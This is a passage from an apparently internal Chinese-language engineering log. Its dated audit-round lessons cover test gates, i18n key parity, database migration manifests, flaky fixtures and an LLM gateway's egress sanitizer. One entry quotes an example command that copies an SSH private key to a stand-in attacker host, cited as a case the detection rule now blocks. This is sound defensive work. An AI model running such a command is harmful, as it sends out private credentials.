  ⇒ 判据上线后**首跑若报违例，先查量具**再查代码（阴性/阳性结论都要一样复核）。
- 证据：`web/src/i18n/localeValueQuality.ts` 新增 `allLocaleModules` /
  `allLocaleKeySets`（键集合口径显式复用 `collectLeafKeys`）；
  修口径后硬闸违例 3 → **0**（可达键 5293 × 8 语种零缺口）。
- 溯源：R56 轮（2026-10-21）`docs/96小时内修订审计-20261007-1350.md` §十四。

## 2026-10-21 — 补一个「**能覆盖旧形状**」的门，比给每个旧形状手写定点回归更值（Seen: 1/3）
- 场景：R55 轮为 zh-CN 分类键缺陷写了**手写定点回归**
  （硬编码 17 个键名 × 8 语种齐备）。R56 轮评估：下一个同形状的键族来了怎么办？
- 根因：手写定点回归**只覆盖那 17 个键名** ⇒ 同形状的**下一个**键族照样漏；
  而「形状」本身（某语种缺了别的语种有的键）是**可判定的** ⇒ 应当有**机制**覆盖。
- 防复发检查：发现缺陷后**先问「这是**形状**还是**个案**」**：
  形状 ⇒ 写**覆盖形状**的门（并保留个案作为定点回归）；
  个案 ⇒ 写定点回归即可。
  ⇒ 覆盖形状的门必须**双向**（R55 的形状是「zh-CN 缺」，**反向**「别的语种缺」
  同样是用户可见缺陷 ⇒ 两种方向都要红）+ 配**非空下限**
  （否则「一把键都没量」也是绿的）+ **不设参照方**
  （R55 §13.6-3 已坐实「参照方本身可能是错的」⇒ 只判「平不平」）。
- 证据：`web/src/i18n/localeKeyParity.ts` 的硬闸（可达键 × 8 语种必须齐备）
  + `localeKeyParity.test.ts` 的两条定点回归（zh-CN 缺 / en-US 缺**两个方向**都红）；
  变异 M1（zh-CN 删键）/ M3（en-US 删键）各红 1 条。
- 溯源：R56 轮（2026-10-21）`docs/96小时内修订审计-20261007-1350.md` §十四。

## 2026-10-21 — 「全绿」与「真跑过」是**两件事**：包级 `ok` 掩盖了几百条从未执行的断言（Seen: 1/3）
- 场景：R57 轮要量「真库腿」（真库断言）到底跑不跑。默认 `go test ./...` 报
  **329 个包绿、只有 2 个包红**，看起来很干净。
- 根因：`go test` 的包级结论只反映「**有没有失败**」，不反映「**有没有执行**」。
  实测：573 条 SKIP 里 **412 条（72%）是因为「没有真库」**，分布在 **401 个 skip 站点** ——
  这些断言**一条都没跑**，而包级结果是 `ok`。
  ⇒ 门禁只报了「没失败」，没报「没跑」⇒ **「检查没跑成」与「检查通过」长得一模一样**。
- 防复发检查：任何「测试全绿 ⇒ 没问题」的结论，都要先问「**这些断言执行了吗**」：
  ① 报告里 SKIP 必须与 FAIL **一样显眼**（本轮实测：573 SKIP vs 2 FAIL 包，
     只看包级汇总会完全错过 412 条）；
  ② 跑真库的门**必须有「0 PASS ⇒ 拒绝报成功」**的语义
     （本仓 `run-integration-gate.sh` 的 `ALLOW_VACUOUS=0` 已有，属既有正确设计）；
  ③ **把「默认跑法」与「真跑」的读数并排**——只有并排才能看出「差出来的那部分是什么」
     （本轮 `scripts/audit/measure-realdb-legs.sh --no-dsn` / `--realdb` 就是这个形状）。
- 证据：`docs/audit/2026-10-21-R57-真库腿体检.md` §1.1（412/573、401 站点）；
  全量读数 `/tmp/r57/go-test-v-nodsn.log`（386 包，ok 329 / FAIL 2 / 无测试 55）。
- 溯源：R57 轮（2026-10-21）`docs/96小时内修订审计-20261007-1350.md` §十五。

## 2026-10-21 — 分类读数时，**某一类占比 >90% 且其余为零 ⇒ 先怀疑分类器**（Seen: 1/3）
- 场景：R57 轮要把几百条 SKIP 按「跳过原因」分类。第一版分类器把 **530/533 条**塌成同一个桶
  「(N.Ns)」，只有 3 条不同。
- 根因：`go test -v` 的 **skip 原因不在 `--- SKIP:` 行上**，而在**独立的一行**
  `    file_test.go:NN: reason`。只看 `--- SKIP:` 行 ⇒ 原因字段为空 ⇒ 所有条目同桶。
  ⇒ **一个「几乎全塌」的分布是量具坏了的典型信号**，不是被测对象的性质。
- 防复发检查：做**分类/聚合**读数时，先看**桶的数量分布**：
  某一类 >90% 且其余近空 ⇒ **先查分类器**（能不能拿到那个字段、字段在第几行、是不是被别的分隔符切掉），
  再信这个分布。与「0 命中的第一嫌疑是量具坏了」同族。
  ⇒ 修法要成对：把「原因行」与「SKIP 标记行」**按最近一条原因行配对**，
  而不是从标记行里正则抠（`/tmp/r57/skip_analyze.py`）。
- 证据：修前分类器输出「530 (N.Ns)」；修后 533 条分成「TEST_DATABASE_URL not set — this needs a
  real database」43 条等 20 余桶，且能进一步量出 412 条属「缺真库」。
- 溯源：R57 轮（2026-10-21）`docs/audit/2026-10-21-R57-真库腿体检.md` §1.1。

## 2026-10-21 — 清单会随「被测面增长」**静默过期**：它只在有人专门跑那一段时才更新（Seen: 1/3）
- 场景：`sql/schema/startup_rerun_known_gaps.tsv` 登记「哪些启动迁移第二遍跑不过」。
  2026-10-04 写的是 11 条；2026-10-21 实测 **24 条**，而门是**红**的（13 条未登记 ⇒ die）。
- 根因：清单**不是**自更新的，它只在「有人专门把那一段跑起来」时才会被改。
  而那一段（第二遍重跑）需要 docker + 一次性 PG + 私有 registry 镜像 ⇒ **平时没人跑**
  ⇒ 清单停在 2026-10-04，而**被测面（链）从 217 条长到了 282 条** ⇒ 13 条新增缺口没人登记。
  ⇒ 清单的**有效期**取决于「触发它的那条流程」跑得多频繁，而不取决于它被写得多认真。
- 防复发检查：给每份清单问一句「**它多久会被更新一次**」：
  ① 触发流程跑得少 ⇒ 清单必然过期 ⇒ 要么把清单**挂到日常流程**上，
     要么给它配**「链变更 ⇒ 清单必须更新」的前置门**（本轮的做法：把窗口锚点取自**磁盘侧**
     ⇒ 「磁盘上最新但台账没登记」必然落窗内 ⇒ 漏登记会自己暴露）；
  ② 清单里的**数字**（条数、链长、预算）也要跟着更新 ⇒ 否则下一个读表头的人拿到的是过期口径
     （本轮同步改了「链 217→282 / 预算 1665→1547 / 条目 11→24」三处）。
- 证据：`docs/audit/2026-10-21-R57-真库腿体检.md` §2.1（282 条链、24 条失败、门 exit 2）；
  登记册补齐后同一命令不再中止。
- 溯源：R57 轮（2026-10-21）`docs/96小时内修订审计-20261007-1350.md` §十五。

## 2026-10-21 — 「级联」与「独立缺陷」必须**分开数**：9 条级联 ≠ 9 个缺陷（Seen: 1/3）
- 场景：重跑迁移链时出现 13 条「未登记的不可重跑文件」。直觉读法 = 13 个独立缺陷。
- 根因：实测坐实它们是**一因多果**：
  链上编号 **< 610** 的视图重建迁移按**旧列集**重建 `request_logs_with_current_month`
  ⇒ 610 加的 `request_class` 被丢掉 ⇒ 610 的幂等守卫谓词**只描述「当前形状」不描述「我是不是做过」**
  ⇒ 抛错中止 ⇒ 扩展永不恢复 ⇒ **9 个下游文件级联失败**；
  另有 2 条是「首遍改名后谓词未同步」（860 改了名，562/808 仍找旧名）、
  1 条是「按设计要求人工介入」、1 条是既有 PG 规则同族。
  ⇒ 逐条登记成 13 个「缺口」会让下一个人以为要修 13 处；实则**一条根因**。
- 防复发检查：登记/计数「N 条失败」前，先问「**它们是 N 个成因还是 1 个成因的 N 个症状**」：
  ① 症状条目要**引用根因条目**（写「级联：见 X 条目」），别各写各的；
  ② 清单的**机制分组**（本仓用 `[M1]`…`[M9]` 标签）就是「按成因归堆」的载体 ——
     本轮 24 条分布为 M1:6 / M2:2 / M3:1 / M4:1 / M5:1 / M6:1 / **M7:2 / M8:9 / M9:1**
     ⇒ 一眼能看出「9 条是同一条级联」。
  ③ 根因要能被**独立坐实**（本轮用真库读数：分区父表实测是 `_request_logs_bodies`、
     `request_logs_default` 的父表实测是 `_request_logs`），不是「看起来像级联」。
- 证据：`sql/schema/startup_rerun_known_gaps.tsv` 的 [M7]/[M8]/[M9] 三组与表头「按机制分组」节；
  `docs/audit/2026-10-21-R57-真库腿体检.md` §2.2。
- 溯源：R57 轮（2026-10-21）`docs/96小时内修订审计-20261007-1350.md` §十五。

## 2026-10-21 — 删掉一个键族 ⇒ 钉住它的**定点回归会红**：要换**同形状的活键**，不是删断言（Seen: 1/3）
- 场景：R57 轮按属主决定删除三个死命名空间（`customer.wizard.*` 等），
  删完 `localePlaceholderParity.test.ts` 的「★ 定点回归：族1 deviceLimitBody 的 8 个语种
  都带 {active}/{max}」立刻红。
- 根因：该定点回归钉的键 `customer.wizard.messages.deviceLimitBody` **就住在被删的命名空间里**
  ⇒ 键没了 ⇒ 8 个语种都读到空 ⇒ 断言必红。
  ⇒ 而这条回归**不是白写的**：它是「**同一键、跨语种占位符必须一致**」这个形状的唯一定点样本。
  ⇒ 直接把断言删掉 ⇒ **这个形状就没人钉了** ⇒ 同形状的下一个键族来了照样漏
  （与 R56 轮「补一个能覆盖旧形状的门」同源）。
- 防复发检查：删除任何键族前，**先查哪些门钉着它**（`grep` 键路径 + 门文件）⇒ 命中就要：
  ① 换成**同形状且真被引用**的**活键**（本轮：`agentRegistryView.pager.pageInfo`，2 个占位符 × 8 语种、
     被引用 ⇒ 形状不减）；② **另补一条「该键族已删除」的钉桩**（本轮新增）⇒
     否则有人重跑同步脚本或从别处拷回词条，**死键会悄悄回来而没有门会响**。
  ③ ★ 门头注释里**用该键举例说明范围决策**的段落要**重新锚定**
     （本轮：范围决策「比全部键、不只被引用的键」**不变**，但举例已随键消失 ⇒ 改注并写明不变的理由）。
- 证据：`web/src/i18n/localePlaceholderParity.test.ts`（族1 → 同形状活键 + 新增「三命名空间已删除」用例）、
  `web/src/i18n/localePlaceholderParity.ts` 头注释的订正段；i18n 套件回到既有基线
  （11 文件：10 passed + 既有红 `hardcoded_cjk`；60 passed）。
- 溯源：R57 轮（2026-10-21）`docs/96小时内修订审计-20261007-1350.md` §十五。

## 2026-10-20 — 收窄「允许清单」的语义要落在**运维能碰的那一层**（解析层），不是匹配层（Seen: 1/3）
- 场景：防外传守卫的硬阻断清单要收窄（egress scope 不再接受 `*` 与 PII 分类器规则），
  但同一批既有判据（r1035 的本地执行豁免、r1016 的公网目的地）**依赖**清单能表达
  「全部可阻断」。
- 根因：清单有**两个入口**——运维侧 `LLM_GATEWAY_HARD_BLOCK_RULES`（解析层）、
  程序侧 `SetHardBlockAllows`（测试基线与嵌入式调用在用）。把限制下沉到**匹配层**
  ⇒ 测试基线里的 `egress:*` 失效 ⇒ 既有判据从「测拦截能力」退化成「测默认不拦」
  ⇒ 阻断侧与允许侧一起假绿。
- 防复发检查：① 收窄「允许/禁止某行为」的清单时，先问「这个限制要管住谁」——
  运维能碰的那层（解析/配置校验）才是执行点；程序内 API 保持可表达测试前提；
  ② 限制若必须下沉到匹配层，**先**把依赖旧语义的夹具（规则 ID 形状）逐个改完，
  再改匹配层，并给每处改动写明「为什么这个形状仍该被允许」。
- 证据：r1039 把限制放在 `ParseHardBlockAllows`（`ValidateHardBlockAllow`），
  `security/sanitize/hardblock_testmain_test.go` 的基线 `egress:*` 照旧可用；
  变异验证：摘掉解析层的校验 ⇒ `TestR1039EgressScopeRejectsWildcardAndClassifierRules`
  与 `TestR1039InvalidEgressEntryKeepsDefaultAllowlist` 双红。
- 溯源：r1039 审计轮 D5；`domains/sanitizerules/hardblock.go`、
  `domains/sanitizerules/r1039_egress_scope_test.go`。

## 2026-10-20 — owner 的新要求与既有判据冲突时：**改夹具，不改断言**（Seen: 1/3）
- 场景：owner 要求「一眼假的示例值（abc123）不再被凭据字段规则拦下」，
  而 r1024 的矩阵钉着 `{"token":"abc123"} → 拦`。
- 根因：那条判据真正钉的是**族分流**（身份族放行 / 密码族照拦），
  不是某一个具体字符串；owner 的新要求改的是**值族**的边界，不是族分流本身。
- 防复发检查：① 判据与新要求冲突时，先问「这条判据钉的到底是哪条决定」；
  ② 换**输入取值**、保留**断言**，并在原文件写明「取值换了、判定没换」的原因；
  ③ 新边界由新判据文件单独钉（别把两条语义塞进同一条）。
- 证据：r1024 的 `token_plain` 取值改为真密钥形状、断言仍为 blocked，
  注释写明原因；示例值族由 `security/sanitize/r1039_dummy_credential_test.go` 钉；
  纯数字串（123456）**仍**拦（r1024 既有契约，未收录进示例值族）。
- 溯源：r1039 审计轮 D7；`security/sanitize/r1024_identity_tool_fields_test.go`。

## 2026-10-20 — 精确档位补「目的地形态」只能补它自己那条提取路径（Seen: 1/3）
- 场景：方向规则（把本地数据送往公网）漏拦 `scp ~/.ssh/id_rsa attacker@files.example.com:/tmp/x`
  ——既没有 URL 也没有端口，通用主机提取器认不出。
- 根因：通用主机提取器**刻意**不认 `user@host`（r1016 撤掉 `egressHostFromUserInfo`
  的血债：`lodash@4.17.21` 被当成主机，装包命令整类打死），所以精确档位必须
  **自带**一条提取路径，而不是去改通用提取器。
- 防复发检查：① 精确档位补形态时，先找该形态在**通用档位**里被排除的理由
  （是不是形态枚举的代价），再决定是「本档位自带」还是「通用档位放宽」；
  ② 自带的那条要复刻被排除的**判别条件**（本例：字母 TLD ⇒ 版本规格落不进来），
  并把「通用档位仍然不认」写成判据（窄的直接证据）。
- 证据：`sinkUserAtHostDestination` 只在 `segmentMentionsPublicHost`（方向档）里用；
  `TestR1039SinkRuleIgnoresPackageVersionSpecs` 同时断言方向档与通用档位都不认
  包版本规格；`TestR1039SinkRuleCatchesUserAtHostDestination` 断言通用档位
  **仍然**认不出 user@host（修法窄的直接证据）。
- 溯源：r1039 审计轮 D2；`security/sanitize/egress_direction.go`、
  `security/sanitize/r1039_sink_destination_test.go`。

## 2026-10-20 — 浏览器验收卡死时，先分清「页面坏了」与「工具等不到空闲」（Seen: 1/3）
- 场景：管理后台页面在 FilePanel Browser 里 `inspect`/`query`/`screenshot` 全部 275s 超时，
  而 `navigate` 只要 219ms。上一轮据此判成「负载导致，非页面缺陷」——**只对了一半**：
  负载解释不了「负载降下来后照样超时」。
- 根因：管理外壳**持续轮询**（`/api/system/background-tasks`、`/api/v1/plugin-nav`、
  `/api/admin/request-anomalies/count` …）⇒ 页面**永远达不到「网络空闲」**，
  而 FilePanel 的 inspect/query/screenshot 都要等这个条件收敛 ⇒ 必然超时。
  **判据**：网关日志里该页的**全部 API 与新资源都取回来了**（assets 200、接口有响应）
  ⇒ 页面是好的，卡住的是工具的等待条件。
- 防复发检查：① 浏览器动作超时，**先查网关日志有没有该页的资源/接口响应**——
  有 ⇒ 是工具等待条件的问题，不是页面缺陷，别去改前端；
  ② 改用**无头 Chrome + CDP 直连**（Node 24 自带 WebSocket，不装 puppeteer）：
  `Page.navigate` → `Runtime.evaluate` 取 DOM → `Network.requestWillBeSent` 抓请求体
  → `Page.captureScreenshot`，**全程不依赖「空闲」条件**；
  ③ 无头 profile 是全新的，会被首启向导重定向到 `/bootstrap`
  ⇒ 导航前用 `Page.addScriptToEvaluateOnNewDocument` 注入
  `localStorage.setItem('llmgw_require_bootstrap','0')` 与 `llmgw_activated='1'`。
- 证据：本轮用该路径完成两个页面的逐项验收（规则详情弹窗 + 按模式矩阵的发布往返），
  证据见 `docs/audit/2026-10-20-r1039-脱敏阻断与设置界面审计轮.md` §7。
- 溯源：r1039 审计轮 §7.1。

## 2026-10-20 — 表单「没选」给空串，落库列是枚举时必 500（Seen: 1/3）
- 场景：从 UI 新建提示词注入自定义规则**必失败**（500），报错是
  `invalid input value for enum injection_action: ""` ——看着像 SQL 问题，其实是**载荷问题**。
- 根因：`category_new` / `action_override` 是**可空枚举**列，但前端表单在「没选」时给的是
  **空串**而不是 null（新建表单的默认值就是 `''`）⇒ 空串被塞进枚举列 ⇒ 22P02。
  列允许 NULL ⇒ 正确语义是「空串 = 不覆盖 ⇒ 落库 NULL」。
- 防复发检查：① 前后端传枚举列时，**先问「没选」在前端长什么样**（`''` 还是 `null`/`undefined`）；
  ② 后端把「空串 = 不覆盖」统一转成 NULL，别指望前端改口径（别处还有别的调用方）；
  ③ 判据要**让 PG 自己拒绝一次空串**（证明前提），再断言 handler 走通了
  ——只测转换 helper 是假绿（helper 对不代表 handler 用了它）。
- 证据：`admin/r1039_prompt_injection_enum_empty_test.go`（真库，3 条）：
  前提用例先证明 PG 拒空串（22P02）+ 接受 NULL；两个 handler 用例断言落库是 NULL。
  变异验证：还原 `enumNullIfEmpty` ⇒ 建规则用例与清空动作覆盖用例双双变红。
- 溯源：r1039 审计轮 §7.3；`admin/prompt_injection_handler.go`。

## 2026-10-20 — 判据要打在使用者看到的那一层，不是「能力所在的那一层」（Seen: 1/3）
- 场景：容错阶段早已会吸收「模型多写的一对花括号」，而且有判据钉着它；
  但真实管线里规范拼写由**精确阶段先行消费**，容错阶段根本看不到那个标记
  ⇒ 缺陷照样活了下来。
- 根因：那条判据**直接调了容错阶段**，绕过了管线上**先跑**的那一段。
  「某能力有判据」≠「该能力在真实路径上生效」。
- 防复发检查：① 写判据前先画出**真实调用链的顺序**，
  判据打在**使用者最终看到的那一层**（整条管线 / 真实 HTTP 响应），
  组件级判据只用来钉**局部逻辑**；
  ② 如果缺陷只在一层可复现，**先用整链判据复现一次**，再拆成局部判据；
  ③ 局部判据与整链判据**都要有**：前者定位，后者防回归。
- 证据：本轮把精确阶段补齐后，判据打在 `RestoreOutputOrMask`（整条管线），
  6 处变异全红；容错阶段那条既有判据**继续保留**（它钉的是局部能力）。
- 溯源：r1039 审计轮；`security/sanitize/sanitizer.go`、
  `security/sanitize/r1039_exact_stage_brace_absorption_test.go`。

## 2026-10-21 — 阈值型判据：噪声底离阈值不到 2 倍 ⇒ 它没有判别力；而同族已有「标记」判据时，应把时钟从判别职责里拿掉（Seen: 1/3）
- 场景：R58 轮合并并行轮后复跑 `go test ./scripts/ursmcheck/ -count=1` ⇒ 整包红在
  `TestOnconflictQueryTimeoutAbortsInsteadOfHanging`，失败消息是
  「psql 挂死时脚本耗时 **15.477654708s**」—— 而这条判据的阈值是 **4s**。
- 根因：这道判据是**时钟**判据（`elapsed > 4s ⇒ 红`），而它自己的**噪声底**
  （宿主 load 39 时隔离连跑 3 次：**1.50 / 2.45 / 1.86s**）离阈值只有 **1.6~2.6 倍**
  ⇒ 负载一高，**夹具的击杀延迟**（假 `timeout` 的 watcher `sleep 1` 被调度拖延，
  极端超载时实测能拖到十几秒）就足以越线
  ⇒ **症状像「被测脚本没设查询上限」，真因在量具**。
- 防复发检查：
  ① **阈值型判据先量噪声底**（隔离连跑 ≥3 次取最大值）；**噪声底/阈值 < 3 倍 ⇒ 阈值没有判别力**
     ⇒ 正确方向是**改判据形态**，不是调阈值（调阈值只是把误报率挪个位置，噪声仍在）；
  ② ★ **同族已有「行为标记」判据时，把时钟从判别职责里拿掉** ——
     本仓 availability 门早就是这么做的（`FAKE_PSQL_COMPLETED` 标记文件：
     替身跑完就写标记 ⇒ 判「标记不存在」= 查询确实被截断，**与时钟无关**）；
     本轮把 onconflict 门改成同款 ⇒ 判别职责归标记，时钟只留一条宽松的「没挂死」兜底；
  ③ ★ **替身的挂起时长必须远大于可能的击杀延迟**（本轮 5s → 60s）：
     替身太短 ⇒ 「杀晚了」会被误读成「没截断」⇒ 又变成一种假红；
     代价只落在变异验证那几轮（没有超时包裹 ⇒ 替身跑满 60s ⇒ 门红）。
- 证据：噪声底实测 1.50/2.45/1.86s vs 阈值 4s；改判据后变异 M1（摘掉被审脚本的 `timeout` 包裹）
  **红且消息精确**：「psql 替身**跑完了**（完成标记已生成，脚本耗时 1m0.3s）—— 查询**没有被截断**」。
- 溯源：R58 轮（2026-10-21）`docs/96小时内修订审计-20261007-1350.md` §十六。

## 2026-10-21 — 夹具自己的诊断输出会污染被测脚本的捕获面 ⇒ 症状指向被测脚本，真因在夹具（Seen: 1/3）
- 场景：R58 轮整包红的**另一个**形态：独立副本（合并前 `f115f342a`）红在
  `TestOnconflictMatchExitsZero`，消息是
  「命中时应 exit 0，实得 3 … ABORT: 期望 4 个字段，实得 1（行：…/bin/timeout:
  **child setpgid (49351 to 49351): Operation not permitted**）」。
- 根因：假 `timeout` 用 bash 的 job control（`set -m`）把后台作业放进新进程组；
  极端负载下 `setpgid` 失败，**bash 把失败写成一行打到它自己的 stderr**；
  而被审脚本正是用 `timeout ... 2>&1` 捕获这一路的
  ⇒ **夹具的噪声混进了「psql 的输出」** ⇒ 字段数从 4 变成 1
  ⇒ 判据报「期望 4 个字段」—— 看起来像**被测脚本的字段契约坏了**。
- 防复发检查：
  ① 任何用 `X ... 2>&1` 捕获「被调方输出」的夹具，都要问一句
     「**夹具自己会不会往这条流里写东西**」⇒ 夹具的每一条诊断都必须能定位来源；
  ② 修法不是放宽断言，而是**把噪声从量具里拿掉**：
     先 `exec 9>&2` 存下真 stderr，再 `exec 2>/dev/null` 静音父进程，
     子进程 exec 之前用 `exec 2>&9` 把 stderr 还原回真管道
     ⇒ bash 自己的抱怨进 /dev/null，而**被调用方的 stderr 一行不少**地回到捕获面。
- 证据：2026-10-21 独立副本整包红在同一条、消息里带 setpgid 行；修后同一条绿（0.70s）。
- 溯源：R58 轮（2026-10-21）`docs/96小时内修订审计-20261007-1350.md` §十六。

## 2026-10-21 — 判据与被测对象**不在同一层** ⇒ 门绿不是因为没缺陷，是因为它没看缺陷所在的那一层（Seen: 1/3）
- 场景：R59 轮分流真库腿 75 条失败时，bg 结算腿 5 条全红在同一个错误上：
  `column rl.origin_stage does not exist (SQLSTATE 42703)` / `rl.quality_flags`。
- 根因：既有守卫 `TestProbeTrafficExclusionPredicateColumnsExistOnTheirFamily`
  把「谓词引用的列」与「**仓内迁移声明的列**」求差集（`sql/objects/tables/request_logs_hot.sql` 等）
  ⇒ 那份列集与生产一致 ⇒ **门是绿的**；
  而失败发生在**测试自己手写的夹具**上（`settleWorkerSchema` 里的 `_request_logs_hot` 只有 12 列）
  ⇒ ⇒ **门绿不是因为没缺陷，是因为它没看缺陷所在的那一层**。
- 防复发检查：
  ① 判据问的是「**被测对象实际用的那份东西**」吗？
     （迁移声明 ≠ 夹具 DDL ≠ 运行时配置 —— 三者可以各差一层，而门只查了其中一层）；
  ② 新门要在**失败发生的那一层**上也做一次差集（本轮：把同一套谓词、同一套列，
     **再对夹具求一次差集** ⇒ 5 条失败当场暴露）；
  ③ 门与失败**同 build tag**（夹具常量住在 `//go:build integration` 的文件里
     ⇒ 无 tag 的门引用不到它 ⇒ 门也得带同一个 tag，否则要么编译不过、要么退到查不到的那一层）。
- 证据：修前 `bg` 包真库跑出 5 条 42703；修后（补 3 列）转绿；
  新门 `bg/probe_policy_fixture_gate_test.go` 的变异 M1/M2/M3 全红且逐字还原（md5 一致）。
- 溯源：R59 轮（2026-10-21）`docs/audit/2026-10-21-R59-真库失败分流.md` §5。

## 2026-10-21 — 分流「真库失败」前必须先量**两边**的形态：一次性库与生产长得不一样（Seen: 1/3）
- 场景：真库腿一批 23514「no partition of relation X found for row」，
  看起来像「产品没有当月分区」⇒ 像是要去生产建分区。
- 根因（实测两侧才看清）：**一次性库**的月分区只有 2026_07/2026_08（无当月 2026_10），
  且 `session_turns`/`sessions`/`session_bodies`/`usage_ledger` **没有 default 兜底分区**；
  而**生产（252，只读实测）**这几族都有 **2026_10 + default** ⇒ ⇒ **生产没问题**。
  成因：`473_partition_precreate_2026_09_10.sql`（预建 2026_09+2026_10）**不在 installer 的注册链里**，
  生产靠 `bg.PartitionManager.ensureNextMonthPartitions` **运行期**建下月分区 ⇒ 一次性库没有网关在跑就没有。
- 防复发检查：
  ① 「这条红在生产上也会发生吗」**必须用读数回答**，不能靠推断 ⇒ 两侧各量一次
     （本轮：一次性库用 `scripts/audit/probe-onetime-db-shape.sh`，生产用只读 psql）；
  ② 量「形态」不只量「有没有这张表」，还要量**列集 / 分区月份 / default 兜底** ——
     这三样决定了「写一行进去」会不会炸；
  ③ 一次性库**按生产形态造**（该有的分区、该有的 default、该有的列），
     否则每次都要在分流表里手工解释一遍（而解释会随时间腐烂）。
- 证据：`docs/audit/2026-10-21-R59-真库失败分流.md` §3（B2）与 §4 的三组读数。
- 溯源：R59 轮（2026-10-21）`docs/audit/2026-10-21-R59-真库失败分流.md`。

## 2026-10-21 — bash 5.x 在 UTF-8 locale 下会把**紧跟变量名的多字节字符**吃进变量名（Seen: 1/3）
- 场景：写 `scripts/audit/probe-onetime-db-shape.sh` 时用
  `echo "== 建一次性库 $DB（容器=$PG_CONTAINER）=="` ⇒ 运行时报
  `行 47: DB?: 未绑定的变量`（`DB` 后面跟了一个不可见的多字节字符）。
- 根因：bash 4.2+ 在多字节 locale 下，**变量名可以含多字节字符** ⇒ `$DB（` 被解析成
  「变量名 `DB` + `（` 的首字节序列」⇒ 那个变量不存在 ⇒ `set -u` 直接中止。
  ⇒ 症状是「未绑定的变量」而**不是**「语法错误」⇒ 第一反应会去找变量没赋值。
- 防复发检查：
  ① shell 脚本里**变量后面紧跟中文/全角标点时，一律写 `${VAR}`**（加花括号把名字钉死）；
  ② 自查：`grep -nP '\$[A-Za-z_][A-Za-z0-9_]*[^\x00-\x7F]' 脚本`（无 `-P` 的 BSD grep 用
     `grep -nE` 配等价模式）⇒ 命中即改；
  ③ ⚠ macOS 自带 `grep` 不支持 `-P` ⇒ 审计脚本别依赖 `-P`（本轮真的撞了一次）。
- 证据：`scripts/audit/probe-onetime-db-shape.sh` 的首轮失败输出与修正后的 `bash` 5.3.9 实测。
- 溯源：R59 轮（2026-10-21）。

## 2026-10-21 — 「已知缺口 = 0」的棘轮可能对**一整类**缺口隐形：它数的是 failed，不是 missing（Seen: 1/3）
- 场景：R60 轮实测 **installer 的全新安装路径出来的库比生产少 23 个列**，
  其中 `provider_models.source` 缺了 ⇒ **新装库连库都开不了**（`db.Open` 直接 42703）。
  而仓里那道 `sql/schema/startup_known_gaps.tsv` 棘轮当时是**空的（0 known gaps）**、门是绿的。
- 根因（**分母不同**）：那道棘轮统计的是「**已登记**的迁移在全新安装上**失败**」（`failed=0`），
  而「文件躺在 `sql/migrations/startup/` 里、**从未被登记**」这件事**根本不进入它的统计**
  ⇒ ⇒ **「没有已知缺口」≠「没有缺口」**。
  ⇒ 而且既有那道空棘轮**只数 registered 的分母**，`missing=0` 这一维压根没人看。
- 防复发检查：
  ① 对任何「N = 0」的计数型门，先问一句「**它的分母是什么**」——
     「已登记的迁移」≠「仓里存在的迁移」；
  ② 问「**这一类缺口会被它数到吗**」：如果不会 ⇒ 这个 0 **不能**当成「没问题」的证据；
  ③ 给「**从未运行**」这一维单独建一个可检对象（本轮的做法：扫描未登记文件 + 真库 oracle）；
  ④ ★ **「空棘轮」不是免责声明**：它的价值在「新增缺口当场变红」，
     而它的盲区（分母之外的东西）必须由**另一道门**覆盖 ⇒ 写文档时要写清「它管什么、不管什么」。
- 证据：`docs/audit/2026-10-21-R60-新装缺列族.md` §5；门 `sql/schema/fresh_install_column_gaps_test.go`。
- 溯源：R60 轮（2026-10-21）。

## 2026-10-21 — 判据要回答的问题若在**运行时状态**里，oracle 就该是**真库**，不是静态解析（Seen: 1/3）
- 场景：要回答「全新安装缺哪些列」⇒ 第一版想静态解析 `sql/schema/01-schema.sql` 抽「基线提供了哪些列」，
  再和迁移链求差集。
- 根因（实测）：解析器只抓到 **271 张表里的 220 张**（`CREATE TABLE` 块一复杂 / 嵌套括号 / 结尾形态
  一变就漏）⇒ 差集里 **84 条全是假阳性** ⇒ ★ **量具坏了，结论会跟着坏**。
  ⇒ 换成**真库当 oracle**（一次性库 = installer 路径的精确复刻）后，答案一次就对上了。
- 防复发检查：
  ① 先问「**这个事实的权威来源在哪**」：在**运行时状态**里（库长什么样）就别去解析文本；
  ② 静态解析只当「**声明层**」用（仓里说这个文件会加什么列），
     要断言「**实际有没有**」就得问库；
  ③ ★ **解析器的召回率要标定**：拿一个**独立来源的读数**对一遍（本轮用「生产 vs 新装」逐列差集
     交叉验证）⇒ 标定不过就别拿它的输出下结论。
- 证据：`docs/audit/2026-10-21-R60-新装缺列族.md` §6.2 的「试过静态解析并放弃」段。
- 溯源：R60 轮（2026-10-21）。

## 2026-10-21 — 量具的**输入格式**也是判据的一部分：切列前先 dump 字节（Seen: 1/3）
- 场景：门要读 `installed_startup_migrations.tsv` 取「已登记迁移集合」，
  第一版按 `line.split("\t")[0]` 取第 0 列。
- 根因：该 TSV 的数据行格式是 **`<index>\t<文件名>`** ⇒ 第 0 列是**序号**（「0」「1」「2」…）
  ⇒ 「已登记集合」实际是**空的** ⇒ 「未登记文件」变成**全部文件** ⇒ 门报 **84 条假缺口**。
  ⇒ 症状极像「这条规则命中太多」，第一反应会是「规则写宽了」，而不是「输入读错了」。
- 防复发检查：
  ① 读**任何** TSV/CSV/登记表前，先 `od -c` 看前几行**的真实分隔符与列序**；
  ② 量具要**拒绝空输入**（本轮的做法：读到 0 条已登记迁移 ⇒ 直接 `Fatal`，
     而不是「那就把所有文件当未登记」⇒ 那正是 84 条假缺口的来源）；
  ③ ★ 输入格式变更 = **判据变更** ⇒ 改格式必须同步改读它的门，并在门里写清格式。
- 证据：`sql/schema/fresh_install_column_gaps_test.go` 的 `readGapManifest` 注释（记着这个坑）。
- 溯源：R60 轮（2026-10-21）。

## 2026-10-21 — 「新装 ≠ 升级」：用**两侧逐列差集**当体检手段，比逐条追红快一个量级（Seen: 1/3）
- 场景：真库腿一批 42703「column does not exist」，逐条追要很久；而这批红其实**不是产品缺陷**。
- 根因：这些红来自**一次性库（新装形态）**与**生产（升级形态）**的差异 ⇒
  两侧逐列求差集一次就把整类捞出来了：**生产有、新装没有 ⇒ 23 个列**，
  而这 23 个列里**只有一部分**是产品真会引用的 ⇒ ⇒ **差集是上界，不是缺陷清单**。
- 防复发检查：
  ① 遇到「新装出来的库跑不起来」类问题，**先做两侧差集**（新装形态 vs 生产形态），
     再决定往哪查 ⇒ 比逐条追红快一个量级；
  ② ★ **差集 ≠ 缺陷清单** ⇒ 必须再过一道「产品真的引用它吗」⇒ 否则会把 benign 差异当缺陷修；
  ③ 差集要**按列 / 按关系两个粒度分开数**：本轮「列缺 23 条」与「关系整个缺 259 个」
